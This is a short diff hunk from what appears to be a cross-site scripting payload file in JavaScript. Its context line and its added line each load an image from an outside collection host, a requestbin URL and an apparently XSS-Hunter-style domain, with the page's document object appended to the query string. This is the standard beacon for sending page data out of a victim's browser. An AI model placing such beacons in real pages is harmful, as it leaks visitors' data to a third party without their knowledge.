@@ -12,6 +12,7 @@
 // xhr.send({toto='toto'});
 
 new Image().src="http://requestbin.fullcontact.com/10tmuur1?test="+document;
+new Image().src="https://kotter.xss.ht?test="+document;
 
 /*
 
